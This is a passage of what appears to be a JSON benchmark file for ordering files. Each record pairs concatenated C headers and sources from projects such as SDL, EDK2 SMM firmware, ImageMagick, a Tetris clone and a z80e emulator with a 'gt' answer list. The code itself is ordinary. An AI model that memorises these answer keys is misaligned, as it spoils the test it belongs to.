\"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'smm/edk2/MdePkg/Include/Protocol/SmmCpuIo2.h'",
            "'smm/edk2/MdePkg/Include/Pi/PiSmmCis.h'",
            "'smm/edk2/MdePkg/Include/Library/SmiHandlerProfileLib.h'",
            "'smm/edk2/MdePkg/Include/PiSmm.h'"
        ],
        "content": "'smm/edk2/MdePkg/Include/Protocol/SmmCpuIo2.h'\n:\n\n#ifndef _SMM_CPU_IO2_H_\n#define _SMM_CPU_IO2_H_\n\n#include <Protocol/MmCpuIo.h>\n\n#define EFI_SMM_CPU_IO2_PROTOCOL_GUID EFI_MM_CPU_IO_PROTOCOL_GUID\n\ntypedef EFI_MM_CPU_IO_PROTOCOL  EFI_SMM_CPU_IO2_PROTOCOL;\n\n\n\n\n#define SMM_IO_UINT8  MM_IO_UINT8\n#define SMM_IO_UINT16 MM_IO_UINT16\n#define SMM_IO_UINT32 MM_IO_UINT32\n#define SMM_IO_UINT64 MM_IO_UINT64\n\ntypedef EFI_MM_IO_WIDTH EFI_SMM_IO_WIDTH;\ntypedef EFI_MM_CPU_IO EFI_SMM_CPU_IO2;\n\ntypedef EFI_MM_IO_ACCESS EFI_SMM_IO_ACCESS2;\n\nextern EFI_GUID gEfiSmmCpuIo2ProtocolGuid;\n\n#endif\n\n'smm/edk2/MdePkg/Include/Pi/PiSmmCis.h'\n:\n\n#ifndef _PI_SMMCIS_H_\n#define _PI_SMMCIS_H_\n\n#include <Pi/PiMmCis.h>\n#include <Protocol/SmmCpuIo2.h>\n\ntypedef struct _EFI_SMM_SYSTEM_TABLE2  EFI_SMM_SYSTEM_TABLE2;\n\n\n\n#define  SMM_SMST_SIGNATURE                MM_MMST_SIGNATURE\n#define  SMM_SPECIFICATION_MAJOR_REVISION  MM_SPECIFICATION_MAJOR_REVISION\n#define  SMM_SPECIFICATION_MINOR_REVISION  MM_SPECIFICATION_MINOR_REVISION\n#define  EFI_SMM_SYSTEM_TABLE2_REVISION    EFI_MM_SYSTEM_TABLE_REVISION\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_SMM_INSTALL_CONFIGURATION_TABLE2)(\n  IN CONST EFI_SMM_SYSTEM_TABLE2    *SystemTable,\n  IN CONST EFI_GUID                 *Guid,\n  IN VOID                           *Table,\n  IN UINTN                          TableSize\n  );\n\ntypedef  EFI_MM_STARTUP_THIS_AP                EFI_SMM_STARTUP_THIS_AP;\ntypedef  EFI_MM_NOTIFY_FN                      EFI_SMM_NOTIFY_FN;\ntypedef  EFI_MM_REGISTER_PROTOCOL_NOTIFY       EFI_SMM_REGISTER_PROTOCOL_NOTIFY;\ntypedef  EFI_MM_INTERRUPT_MANAGE               EFI_SMM_INTERRUPT_MANAGE;\ntypedef  EFI_MM_HANDLER_ENTRY_POINT            EFI_SMM_HANDLER_ENTRY_POINT2;\ntypedef  EFI_MM_INTERRUPT_REGISTER             EFI_SMM_INTERRUPT_REGISTER;\ntypedef  EFI_MM_INTERRUPT_UNREGISTER           EFI_SMM_INTERRUPT_UNREGISTER;\n\n\n\n\ntypedef struct _EFI_SMM_ENTRY_CONTEXT {\n  EFI_SMM_STARTUP_THIS_AP  SmmStartupThisAp;\n\n\n\n\n  UINTN                    CurrentlyExecutingCpu;\n\n\n\n\n  UINTN                    NumberOfCpus;\n\n\n\n\n\n  UINTN                    *CpuSaveStateSize;\n\n\n\n\n\n  VOID                     **CpuSaveState;\n} EFI_SMM_ENTRY_CONTEXT;\n\n\ntypedef\nVOID\n(EFIAPI *EFI_SMM_ENTRY_POINT)(\n  IN CONST EFI_SMM_ENTRY_CONTEXT  *SmmEntryContext\n  );\n\n\n\n\n\n\n\n\nstruct _EFI_SMM_SYSTEM_TABLE2 {\n\n\n\n  EFI_TABLE_HEADER                     Hdr;\n\n\n\n\n  CHAR16                               *SmmFirmwareVendor;\n\n\n\n  UINT32                               SmmFirmwareRevision;\n\n  EFI_SMM_INSTALL_CONFIGURATION_TABLE2 SmmInstallConfigurationTable;\n\n\n\n\n  EFI_SMM_CPU_IO2_PROTOCOL             SmmIo;\n\n\n\n\n  EFI_ALLOCATE_POOL                    SmmAllocatePool;\n  EFI_FREE_POOL                        SmmFreePool;\n  EFI_ALLOCATE_PAGES                   SmmAllocatePages;\n  EFI_FREE_PAGES                       SmmFreePages;\n\n\n\n\n  EFI_SMM_STARTUP_THIS_AP              SmmStartupThisAp;\n\n\n\n\n\n\n\n\n\n  UINTN                                CurrentlyExecutingCpu;\n\n\n\n  UINTN                                NumberOfCpus;\n\n\n\n\n\n  UINTN                                *CpuSaveStateSize;\n\n\n\n\n\n  VOID                                 **CpuSaveState;\n\n\n\n\n\n\n\n\n  UINTN                                NumberOfTableEntries;\n\n\n\n\n  EFI_CONFIGURATION_TABLE              *SmmConfigurationTable;\n\n\n\n\n  EFI_INSTALL_PROTOCOL_INTERFACE       SmmInstallProtocolInterface;\n  EFI_UNINSTALL_PROTOCOL_INTERFACE     SmmUninstallProtocolInterface;\n  EFI_HANDLE_PROTOCOL                  SmmHandleProtocol;\n  EFI_SMM_REGISTER_PROTOCOL_NOTIFY     SmmRegisterProtocolNotify;\n  EFI_LOCATE_HANDLE                    SmmLocateHandle;\n  EFI_LOCATE_PROTOCOL                  SmmLocateProtocol;\n\n\n\n\n  EFI_SMM_INTERRUPT_MANAGE             SmiManage;\n  EFI_SMM_INTERRUPT_REGISTER           SmiHandlerRegister;\n  EFI_SMM_INTERRUPT_UNREGISTER         SmiHandlerUnRegister;\n};\n\n#endif\n\n'smm/edk2/MdePkg/Include/Library/SmiHandlerProfileLib.h'\n:\n\n#ifndef __SMI_HANDLER_PROFILE_LIB_H__\n#define __SMI_HANDLER_PROFILE_LIB_H__\n\n#include <PiSmm.h>\n\n\nEFI_STATUS\nEFIAPI\nSmiHandlerProfileRegisterHandler (\n  IN EFI_GUID                       *HandlerGuid,\n  IN EFI_SMM_HANDLER_ENTRY_POINT2   Handler,\n  IN PHYSICAL_ADDRESS               CallerAddress,\n  IN VOID                           *Context, OPTIONAL\n  IN UINTN                          ContextSize OPTIONAL\n  );\n\n\nEFI_STATUS\nEFIAPI\nSmiHandlerProfileUnregisterHandler (\n  IN EFI_GUID                       *HandlerGuid,\n  IN EFI_SMM_HANDLER_ENTRY_POINT2   Handler,\n  IN VOID                           *Context, OPTIONAL\n  IN UINTN                          ContextSize OPTIONAL\n  );\n\n#endif\n\n'smm/edk2/MdePkg/Include/PiSmm.h'\n:\n\n#ifndef __PI_SMM_H__\n#define __PI_SMM_H__\n\n#include <Uefi/UefiBaseType.h>\n#include <Uefi/UefiSpec.h>\n\n#include <Pi/PiSmmCis.h>\n\n#endif\n\n",
        "gt": [
            "'smm/edk2/MdePkg/Include/Protocol/SmmCpuIo2.h'",
            "'smm/edk2/MdePkg/Include/Pi/PiSmmCis.h'",
            "'smm/edk2/MdePkg/Include/PiSmm.h'",
            "'smm/edk2/MdePkg/Include/Library/SmiHandlerProfileLib.h'"
        ]
    },
    {
        "files": [
            "'canvas/_include/magick/MagickCore.h'",
            "'canvas/_include/magick/configure.h'",
            "'canvas/_include/magick/api.h'"
        ],
        "content": "'canvas/_include/magick/MagickCore.h'\n:\n\n#ifndef _MAGICKCORE_CORE_H\n#define _MAGICKCORE_CORE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#if !defined(_MAGICKCORE_CONFIG_H)\n# define _MAGICKCORE_CONFIG_H\n# if !defined(vms) && !defined(macintosh)\n#  include \"magick/magick-config.h\"\n# else\n#  include \"magick-config.h\"\n# endif\n#if defined(_magickcore_const) && !defined(const)\n# define const _magickcore_const\n#endif\n#if defined(_magickcore_inline) && !defined(inline)\n# define inline _magickcore_inline\n#endif\n#if defined(_magickcore_restrict) && !defined(restrict)\n# define restrict  _magickcore_restrict\n#endif\n# if defined(__cplusplus) || defined(c_plusplus)\n#  undef inline\n# endif\n#endif\n\n#include <stdio.h>\n#include <stdarg.h>\n#include <stdlib.h>\n#include <sys/types.h>\n\n#if defined(WIN32) || defined(WIN64)\n#  define MAGICKCORE_WINDOWS_SUPPORT\n#else\n#  define MAGICKCORE_POSIX_SUPPORT\n#endif\n\n#include \"magick/method-attribute.h\"\n\n#if defined(MAGICKCORE_NAMESPACE_PREFIX)\n# include \"magick/methods.h\"\n#endif\n#include \"magick/magick-type.h\"\n#include \"magick/accelerate.h\"\n#include \"magick/animate.h\"\n#include \"magick/annotate.h\"\n#include \"magick/artifact.h\"\n#include \"magick/attribute.h\"\n#include \"magick/blob.h\"\n#include \"magick/cache.h\"\n#include \"magick/cache-view.h\"\n#include \"magick/cipher.h\"\n#include \"magick/client.h\"\n#include \"magick/coder.h\"\n#include \"magick/color.h\"\n#include \"magick/colorspace.h\"\n#include \"magick/colormap.h\"\n#include \"magick/compare.h\"\n#include \"magick/composite.h\"\n#include \"magick/compress.h\"\n#include \"magick/configure.h\"\n#include \"magick/constitute.h\"\n#include \"magick/decorate.h\"\n#include \"magick/delegate.h\"\n#include \"magick/deprecate.h\"\n#include \"magick/display.h\"\n#include \"magick/distort.h\"\n#include \"magick/draw.h\"\n#include \"magick/effect.h\"\n#include \"magick/enhance.h\"\n#include \"magick/exception.h\"\n#include \"magick/feature.h\"\n#include \"magick/fourier.h\"\n#include \"magick/fx.h\"\n#include \"magick/gem.h\"\n#include \"magick/geometry.h\"\n#include \"magick/hashmap.h\"\n#include \"magick/histogram.h\"\n#include \"magick/identify.h\"\n#include \"magick/image.h\"\n#include \"magick/image-view.h\"\n#include \"magick/layer.h\"\n#include \"magick/list.h\"\n#include \"magick/locale_.h\"\n#include \"magick/log.h\"\n#include \"magick/magic.h\"\n#include \"magick/magick.h\"\n#include \"magick/matrix.h\"\n#include \"magick/memory_.h\"\n#include \"magick/module.h\"\n#include \"magick/mime.h\"\n#include \"magick/monitor.h\"\n#include \"magick/montage.h\"\n#include \"magick/morphology.h\"\n#include \"magick/option.h\"\n#include \"magick/paint.h\"\n#include \"magick/pixel.h\"\n#include \"magick/policy.h\"\n#include \"magick/prepress.h\"\n#include \"magick/profile.h\"\n#include \"magick/property.h\"\n#include \"magick/quantize.h\"\n#include \"magick/quantum.h\"\n#include \"magick/registry.h\"\n#include \"magick/random_.h\"\n#include \"magick/resample.h\"\n#include \"magick/resize.h\"\n#include \"magick/resource_.h\"\n#include \"magick/segment.h\"\n#include \"magick/shear.h\"\n#include \"magick/signature.h\"\n#include \"magick/splay-tree.h\"\n#include \"magick/stream.h\"\n#include \"magick/statistic.h\"\n#include \"magick/string_.h\"\n#include \"magick/timer.h\"\n#include \"magick/token.h\"\n#include \"magick/transform.h\"\n#include \"magick/threshold.h\"\n#include \"magick/type.h\"\n#include \"magick/utility.h\"\n#include \"magick/version.h\"\n#include \"magick/xml-tree.h\"\n#include \"magick/xwindow.h\"\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/magick/configure.h'\n:\n#ifndef _MAGICKCORE_CONFIGURE_H\n#define _MAGICKCORE_CONFIGURE_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#include \"magick/hashmap.h\"\n\ntypedef struct _ConfigureInfo\n{\n  char\n    *path,\n    *name,\n    *value;\n\n  MagickBooleanType\n    exempt,\n    stealth;\n\n  struct _ConfigureInfo\n    *previous,\n    *next;\n\n  size_t\n    signature;\n} ConfigureInfo;\n\nextern MagickExport char\n  **GetConfigureList(const char *,size_t *,ExceptionInfo *),\n  *GetConfigureOption(const char *);\n\nextern MagickExport const char\n  *GetConfigureValue(const ConfigureInfo *);\n\nextern MagickExport const ConfigureInfo\n  *GetConfigureInfo(const char *,ExceptionInfo *),\n  **GetConfigureInfoList(const char *,size_t *,ExceptionInfo *);\n\nextern MagickExport LinkedListInfo\n  *DestroyConfigureOptions(LinkedListInfo *),\n  *GetConfigurePaths(const char *,ExceptionInfo *),\n  *GetConfigureOptions(const char *,ExceptionInfo *);\n\nextern MagickExport MagickBooleanType\n  ConfigureComponentGenesis(void),\n  ListConfigureInfo(FILE *,ExceptionInfo *);\n\nextern MagickExport void\n  ConfigureComponentTerminus(void);\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n\n'canvas/_include/magick/api.h'\n:\n\n#ifndef _MAGICKCORE_API_DEPRECATED_H\n#define _MAGICKCORE_API_DEPRECATED_H\n\n#if defined(__cplusplus) || defined(c_plusplus)\nextern \"C\" {\n#endif\n\n#include \"magick/MagickCore.h\"\n\n#if defined(__cplusplus) || defined(c_plusplus)\n}\n#endif\n\n#endif\n",
        "gt": [
            "'canvas/_include/magick/configure.h'",
            "'canvas/_include/magick/MagickCore.h'",
            "'canvas/_include/magick/api.h'"
        ]
    },
    {
        "files": [
            "'tetris-sdl-c/src/main.h'",
            "'tetris-sdl-c/src/sds.h'",
            "'tetris-sdl-c/src/init.h'",
            "'tetris-sdl-c/src/defs.h'",
            "'tetris-sdl-c/src/main.c'"
        ],
        "content": "'tetris-sdl-c/src/main.h'\n:#include \"defs.h\"\n\n#include \"init.h\"\n#include \"graphics.h\"\n#include \"input.h\"\n#include \"tetris.h\"\n\n\nSDL_Window *window;\nSDL_Renderer *render;\nSDL_Texture *display;\nTTF_Font *gFont;\n\nbool render_changed;\n\n'tetris-sdl-c/src/sds.h'\n:\n\n#ifndef __SDS_H\n#define __SDS_H\n\n#define SDS_MAX_PREALLOC (1024*1024)\n\n#include <sys/types.h>\n#include <stdarg.h>\n\ntypedef char *sds;\n\nstruct sdshdr {\n    int len;\n    int free;\n    char buf[];\n};\n\nstatic inline size_t sdslen(const sds s) {\n    struct sdshdr *sh = (void*)(s-sizeof *sh);\n    return sh->len;\n}\n\nstatic inline size_t sdsavail(const sds s) {\n    struct sdshdr *sh = (void*)(s-sizeof *sh);\n    return sh->free;\n}\n\nsds sdsnewlen(const void *init, size_t initlen);\nsds sdsnew(const char *init);\nsds sdsempty(void);\nsize_t sdslen(const sds s);\nsds sdsdup(const sds s);\nvoid sdsfree(sds s);\nsize_t sdsavail(const sds s);\nsds sdsgrowzero(sds s, size_t len);\nsds sdscatlen(sds s, const void *t, size_t len);\nsds sdscat(sds s, const char *t);\nsds sdscatsds(sds s, const sds t);\nsds sdscpylen(sds s, const char *t, size_t len);\nsds sdscpy(sds s, const char *t);\n\nsds sdscatvprintf(sds s, const char *fmt, va_list ap);\n#ifdef __GNUC__\nsds sdscatprintf(sds s, const char *fmt, ...)\n    __attribute__((format(printf, 2, 3)));\n#else\nsds sdscatprintf(sds s, const char *fmt, ...);\n#endif\n\nvoid sdstrim(sds s, const char *cset);\nvoid sdsrange(sds s, int start, int end);\nvoid sdsupdatelen(sds s);\nvoid sdsclear(sds s);\nint sdscmp(const sds s1, const sds s2);\nsds *sdssplitlen(const char *s, int len, const char *sep, int seplen, int *count);\nvoid sdsfreesplitres(sds *tokens, int count);\nvoid sdstolower(sds s);\nvoid sdstoupper(sds s);\nsds sdsfromlonglong(long long value);\nsds sdscatrepr(sds s, const char *p, size_t len);\nsds *sdssplitargs(const char *line, int *argc);\nsds sdsmapchars(sds s, const char *from, const char *to, size_t setlen);\nsds sdsjoin(char **argv, int argc, char *sep, size_t seplen);\nsds sdsjoinsds(sds *argv, int argc, const char *sep, size_t seplen);\n\n\nsds sdsMakeRoomFor(sds s, size_t addlen);\nvoid sdsIncrLen(sds s, int incr);\nsds sdsRemoveFreeSpace(sds s);\nsize_t sdsAllocSize(sds s);\n\n#endif\n\n'tetris-sdl-c/src/init.h'\n:#include \"defs.h\"\n#include \"graphics.h\"\n#include \"tetris.h\"\n\n\nSDL_Window *window;\nSDL_Renderer *render;\n\nvoid init();\n\nvoid cleanup();\n\n'tetris-sdl-c/src/defs.h'\n:#include <stdio.h>\n#include <string.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <time.h>\n#include <assert.h>\n#include <stdbool.h>\n#include \"sds.h\"\n#include \"SDL2/SDL.h\"\n#include \"SDL2/SDL_ttf.h\"\n#include \"SDL2_gfxPrimitives.h\"\n\n#ifndef _GLOBAL_CONSTANTS\n#define _GLOBAL_CONSTANTS\n\n#define WINDOW_TITLE \"tetris-sdl-c\"\n\n\n#define BLOCK_SIZE 20\n\n\n#define PLAYFIELD_HEIGHT 22\n#define PLAYFIELD_WIDTH 10\n\n#define WINDOW_HEIGHT PLAYFIELD_HEIGHT * (BLOCK_SIZE + 1) + 1\n#define WINDOW_WIDTH PLAYFIELD_WIDTH * (BLOCK_SIZE + 1) + 1\n\n#endif\n\n'tetris-sdl-c/src/main.c'\n:#include \"main.h\"\n\nint main(int argc, const char *argv[]) {\n\n\n\n    uint32_t flags = SDL_INIT_TIMER | SDL_INIT_VIDEO | SDL_INIT_EVENTS;\n    if (SDL_Init(SDL_INIT_EVERYTHING) != 0) {\n\n        fprintf(stderr,\n                \"\\nUnable to initialize SDL:  %s\\n\",\n                SDL_GetError());\n\n        return 1;\n    }\n\n    atexit(cleanup);\n\n    init();\n\n    bool quit = false;\n    while(!quit) {\n\n        preRender();\n\n        getInput();\n\n        updateTetris();\n\n        updateRender();\n\n\n\n        SDL_Delay(16);\n    }\n\n    return 0;\n}\n",
        "gt": [
            "'tetris-sdl-c/src/sds.h'",
            "'tetris-sdl-c/src/defs.h'",
            "'tetris-sdl-c/src/init.h'",
            "'tetris-sdl-c/src/main.h'",
            "'tetris-sdl-c/src/main.c'"
        ]
    },
    {
        "files": [
            "'z80e/libz80e/include/z80e/runloop/runloop.h'",
            "'z80e/libz80e/src/ti/asic.c'",
            "'z80e/libz80e/include/z80e/ti/asic.h'"
        ],
        "content": "'z80e/libz80e/include/z80e/runloop/runloop.h'\n:#ifndef RUNLOOP_H\n#define RUNLOOP_H\n\ntypedef struct runloop_state runloop_state_t;\n#include <z80e/ti/asic.h>\n\n\nrunloop_state_t *runloop_init(asic_t *);\n\nvoid runloop_tick_cycles(runloop_state_t *, int);\nvoid runloop_tick(runloop_state_t *);\n#endif\n\n'z80e/libz80e/src/ti/asic.c'\n:#include \"ti/asic.h\"\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"log/log.h\"\n#include \"core/cpu.h\"\n#include \"ti/memory.h\"\n#include \"ti/hardware/t6a04.h\"\n#include \"ti/hardware/speed.h\"\n#include \"ti/hardware/memorymapping.h\"\n#include \"ti/hardware/keyboard.h\"\n#include \"ti/hardware/status.h\"\n#include \"ti/hardware/flash.h\"\n#include \"ti/hardware/link.h\"\n#include \"ti/hardware/timers.h\"\n\ntypedef struct {\n\tasic_t *asic;\n\tuint8_t port;\n} unimplemented_device_t;\n\nuint8_t read_unimplemented_port(void *device) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to read from unimplemented port 0x%02x from 0x%04X.\", d->port, d->asic->cpu->registers.PC);\n\treturn 0x00;\n}\n\nvoid write_unimplemented_port(void *device, uint8_t value) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to write 0x%02x to unimplemented port 0x%02x from 0x%04X.\", value, d->port, d->asic->cpu->registers.PC);\n}\n\nvoid plug_devices(asic_t *asic) {\n\n\tint i;\n\tfor (i = 0; i < 0x100; i++) {\n\t\tunimplemented_device_t *d = malloc(sizeof(unimplemented_device_t));\n\t\td->asic = asic;\n\t\td->port = i;\n\t\tz80iodevice_t device = { d, read_unimplemented_port, write_unimplemented_port };\n\t\tasic->cpu->devices[i] = device;\n\t}\n\n\tasic->cpu->devices[0x01] = init_keyboard();\n\tasic->cpu->devices[0x02] = init_status(asic);\n\tasic->cpu->devices[0x03] = init_interrupts(asic, &asic->interrupts);\n\tsetup_lcd_display(asic, asic->hook);\n\n\tif (asic->device != TI73 && asic->device != TI83p) {\n\t\tasic->cpu->devices[0x20] = init_speed(asic);\n\t\tinit_crystal_timers(asic);\n\t}\n\n\tinit_link_ports(asic);\n\tinit_mapping_ports(asic);\n\tinit_flash_ports(asic);\n}\n\nvoid asic_null_write(void *ignored, uint8_t value) {}\n\nvoid asic_mirror_ports(asic_t *asic) {\n\tint i;\n\tswitch (asic->device) {\n\tcase TI83p:\n\t\tfor (i = 0x08; i < 0x10; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tasic->cpu->devices[0x12] = asic->cpu->devices[0x10];\n\t\tasic->cpu->devices[0x13] = asic->cpu->devices[0x11];\n\t\tasic->cpu->devices[0x15] = asic->cpu->devices[0x05];\n\t\tasic->cpu->devices[0x15].write_out = asic_null_write;\n\t\tfor (i = 0x17; i < 0x100; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor (i = 0x60; i < 0x80; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i - 0x20];\n\t\t}\n\t\tbreak;\n\t}\n}\n\nvoid free_devices(asic_t *asic) {\n\n\tfree_keyboard(asic->cpu->devices[0x01].device);\n\tfree_status(asic->cpu->devices[0x02]);\n\tfree_mapping_ports(asic);\n}\n\nasic_t *asic_init(ti_device_type type, log_t *log) {\n\tasic_t* device = calloc(1, sizeof(asic_t));\n\tdevice->log = log;\n\tdevice->cpu = cpu_init(log);\n\tdevice->mmu = ti_mmu_init(type, log);\n\tdevice->cpu->memory = (void*)device->mmu;\n\tdevice->cpu->read_byte = ti_read_byte;\n\tdevice->cpu->write_byte = ti_write_byte;\n\tdevice->battery = BATTERIES_GOOD;\n\tdevice->device = type;\n\tdevice->clock_rate = 6000000;\n\n\tdevice->timers = calloc(1, sizeof(z80_hardware_timers_t));\n\tdevice->timers->max_timers = 20;\n\tdevice->timers->timers = calloc(20, sizeof(z80_hardware_timer_t));\n\n\tdevice->stopped = 0;\n\tdevice->debugger = 0;\n\tdevice->runloop = runloop_init(device);\n\tdevice->hook = create_hook_set(device);\n\n\tdevice->link = calloc(1, sizeof(z80_link_socket_t));\n\n\tplug_devices(device);\n\tasic_mirror_ports(device);\n\treturn device;\n}\n\nvoid asic_free(asic_t* device) {\n\tti_mmu_free(device->mmu);\n\tfree_devices(device);\n\tcpu_free(device->cpu);\n\tfree(device);\n}\n\nint asic_add_timer(asic_t *asic, int flags, double frequency, timer_tick tick, void *data) {\n\tz80_hardware_timer_t *timer = 0;\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tif (!(asic->timers->timers[i].flags & TIMER_IN_USE)) {\n\t\t\ttimer = &asic->timers->timers[i];\n\t\t\tbreak;\n\t\t}\n\n\t\tif (i == asic->timers->max_timers - 1) {\n\t\t\tasic->timers->max_timers += 10;\n\t\t\tasic->timers->timers = realloc(asic->timers->timers, sizeof(z80_hardware_timer_t) * asic->timers->max_timers);\n\t\t\tz80_hardware_timer_t *ne = &asic->timers->timers[asic->timers->max_timers - 10];\n\t\t\tmemset(ne, 0, sizeof(z80_hardware_timer_t) * 10);\n\t\t}\n\t}\n\n\ttimer->cycles_until_tick = asic->clock_rate / frequency;\n\ttimer->flags = flags | TIMER_IN_USE;\n\ttimer->frequency = frequency;\n\ttimer->on_tick = tick;\n\ttimer->data = data;\n\treturn i;\n}\n\nvoid asic_remove_timer(asic_t *asic, int index) {\n\tasic->timers->timers[index].flags &= ~TIMER_IN_USE;\n}\n\nint asic_set_clock_rate(asic_t *asic, int new_rate) {\n\tint old_rate = asic->clock_rate;\n\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tz80_hardware_timer_t *timer = &asic->timers->timers[i];\n\t\tif (timer->flags & TIMER_IN_USE) {\n\t\t\ttimer->cycles_until_tick =\n\t\t\t\tnew_rate / (timer->cycles_until_tick * timer->frequency);\n\t\t}\n\t}\n\n\tasic->clock_rate = new_rate;\n\treturn old_rate;\n}\n\n'z80e/libz80e/include/z80e/ti/asic.h'\n:#ifndef ASIC_H\n#define ASIC_H\n\n#include <stdint.h>\n#ifndef NOLINK\n#include <poll.h>\n#endif\n\ntypedef struct asic asic_t;\n\n#include <z80e/core/cpu.h>\n#include <z80e/log/log.h>\n#include <z80e/ti/memory.h>\n#include <z80e/ti/ti.h>\n#include <z80e/runloop/runloop.h>\n#include <z80e/debugger/hooks.h>\n#include <z80e/debugger/debugger.h>\n#include <z80e/ti/hardware/interrupts.h>\n\ntypedef enum {\n\tBATTERIES_REMOVED,\n\tBATTERIES_LOW,\n\tBATTERIES_GOOD\n} battery_state;\n\n\ntypedef void (*timer_tick)(asic_t *, void *);\ntypedef struct z80_hardware_timers z80_hardware_timers_t;\ntypedef struct z80_hardware_timer z80_hardware_timer_t;\ntypedef struct z80_link_socket z80_link_socket_t;\n\nenum {\n\tTIMER_IN_USE = (1 << 0),\n\tTIMER_ONE_SHOT = (1 << 1)\n};\n\nstruct z80_hardware_timer {\n\tint cycles_until_tick;\n\n\tint flags;\n\tdouble frequency;\n\ttimer_tick on_tick;\n\tvoid *data;\n};\n\nstruct z80_hardware_timers {\n\tint max_timers;\n\tz80_hardware_timer_t *timers;\n};\n\nstruct z80_link_socket {\n#ifndef NOLINK\n\tint accept;\n\tstruct pollfd listenfd;\n\tstruct pollfd clients[10];\n#endif\n};\n\nstruct asic {\n\tint stopped;\n\tti_device_type device;\n\tbattery_state battery;\n\tint battery_remove_check;\n\tint clock_rate;\n\n\tz80cpu_t* cpu;\n\trunloop_state_t *runloop;\n\tti_mmu_t* mmu;\n\tti_interrupts_t *interrupts;\n\tz80_hardware_timers_t *timers;\n\tz80_link_socket_t *link;\n\thook_info_t *hook;\n\tlog_t *log;\n\tdebugger_t *debugger;\n};\n\nasic_t* asic_init(ti_device_type, log_t *);\nvoid asic_free(asic_t*);\n\nint asic_set_clock_rate(asic_t *, int);\n\nint asic_add_timer(asic_t *, int, double, timer_tick, void *);\nvoid asic_remove_timer(asic_t *, int);\n\n#endif\n",
        "gt": [
            "'z80e/libz80e/include/z80e/runloop/runloop.h'",
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/src/ti/asic.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
